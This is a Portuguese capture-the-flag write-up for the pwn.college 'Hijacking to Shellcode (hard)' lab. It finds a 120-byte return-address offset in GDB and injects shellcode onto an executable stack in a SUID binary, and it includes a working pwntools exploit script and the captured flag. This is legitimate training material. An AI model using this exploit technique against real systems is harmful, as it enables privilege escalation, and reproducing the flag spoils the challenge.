# pwn.college — Hijacking to Shellcode (hard)
### Intro to Cybersecurity · Orange Belt · Binary Exploitation

> **Autor:** Pedro Tuttman  
> **Plataforma:** [pwn.college](https://pwn.college)  
> **Categoria:** Binary Exploitation — Intro to Cybersecurity (Orange Belt)  
> **Técnicas:**  Stack buffer overflow · Return address overwrite · Stack shellcode injection · Executable stack abuse · GDB dynamic analysis · Cyclic pattern offset discovery · SUID privilege abuse · Position-independent shellcode · Direct syscall shellcode

## Descrição do Desafio

Este desafio é a versão difícil do anterior. A mecânica é idêntica — buffer overflow com shellcode injetado diretamente na stack executável — mas desta vez o binário **não imprime o stack frame**, não diz onde começa o buffer, não diz onde está o return address. Toda essa informação precisa ser descoberta via GDB.

As proteções são as mesmas do easy: sem canary, sem PIE, stack executável — o que torna a exploração possível, mas exige análise manual para descobrir o offset e o endereço de destino.

---

## Descobrindo o Funcionamento via GDB

### Passo 1: Entender o fluxo do binário

![input](figuras/input-hijackung-shellcode(hard).png)

Ao rodar o binário no GDB com `run`, ele solicita apenas **um único input** ("Send your payload (up to 4096 bytes)!"). Enviei um padrão cyclic de 500 bytes para identificar o offset até o return address.

### Passo 2: Localizar o `read` do stack buffer no disassembly

![read](figuras/read-hijacking-shellcode(hard).png)

Com `disas challenge` no GDB, localizei o `read` responsável por ler o payload:

```asm
<+157>:  mov  rdx, QWORD PTR [rbp-0x8]
<+161>:  lea  rax, [rbp-0x70]
<+165>:  mov  rsi, rax
<+168>:  mov  edi, 0x0
<+173>:  call 0x401130 <read@plt>
```

O buffer começa em `rbp-0x70`. O return address está em `rbp+0x8`. O offset do buffer até o return address é:

```
rbp+0x8 - (rbp-0x70) = 0x70 + 0x8 = 0x78 = 120 bytes
```

### Passo 3: Confirmar com cyclic — segfault no `ret`

![ret](figuras/ret-hijacking-shellcode(hard).png)

Após enviar o padrão cyclic como input, o programa deu segfault. Confirmei que foi exatamente no `ret`:

```
x/i $rip
=> 0x401b48 <challenge+249>:  ret
```

Então verifiquei o valor que estava no `rsp` — que é o que o `ret` tentaria carregar no `rip`:

```
x/gx $rsp
0x7fffffffda08:  0x6161616161616170
```

O valor `0x6161616161616170` é um padrão do cyclic. Usando `cyclic_find`:

```python
cyclic_find(0x6161616161616170, n=8)  →  120
```

Offset confirmado: **120 bytes**.

---

## A Estratégia: Shellcode na Stack

Assim como no desafio easy, a stack é executável — então o shellcode pode ser colocado diretamente no payload, logo após o return address sobrescrito.

O return address é sobrescrito com o endereço **imediatamente após ele na stack** — onde o shellcode começa. Como o binário não tem PIE, os endereços da stack se mantêm estáveis entre execuções no mesmo ambiente. O endereço do return address observado no GDB foi `0x7fffffffda08`, portanto o shellcode começa em `0x7fffffffda10` — 8 bytes após.

```
payload layout na stack:
[  120 bytes "A"  ]  →  preenche o buffer até o return address
[ p64(0x7fffffffda10) ]  →  sobrescreve o return address
[   shellcode1-raw   ]  →  shellcode na stack, executado ao retornar
```

---

## O Payload

![resultado](figuras/resultado-hijacking-shellcode(hard).png)

```python
from pwn import *

p = process("/challenge/binary-exploitation-hijack-to-shellcode")
sh = open("shellcode1-raw", "rb").read()

# Único input: 120 bytes de padding + novo return address + shellcode
p.send(b"A" * 120 + p64(0x7fffffffda10) + sh)
p.interactive()
```

Ao retornar da função `challenge()`, o processador carrega `0x7fffffffda10` no `rip` e salta para o shellcode na stack, executando-o com EUID=0.

---

## Resultado

```
Send your payload (up to 4096 bytes)!
Goodbye!
pwn.college{Qb03iTllawGPSgR_Z2pi0e8t7Cs.dJjMzwCOzYTNxEzW}
```

---

## Resumo do Fluxo de Exploração

```
1. GDB → disas challenge → buffer em rbp-0x70, offset = 120 bytes
2. cyclic(500) → segfault no ret → cyclic_find(rsp) = 120 → confirmado
3. Stack executável → shellcode injetado direto no payload
4. Return address sobrescrito com 0x7fffffffda10 (logo após ret addr na stack)
5. challenge() retorna → CPU salta para shellcode na stack
6. Shellcode: open/read/write do /flag com EUID=0
```

---

## Comparação entre Easy e Hard

| | Hijack to Shellcode (Easy) | Hijack to Shellcode (Hard) |
|---|---|---|
| Stack frame impresso | ✅ Sim | ❌ Não |
| Offset até return address | Calculado do stack frame | GDB + cyclic (120 bytes) |
| Endereço do shellcode | Lido do stack frame | Calculado a partir do rsp no GDB |
| Número de inputs | 1 | 1 |
| Stack executável | ✅ Sim | ✅ Sim |
| PIE | ❌ No PIE | ❌ No PIE |
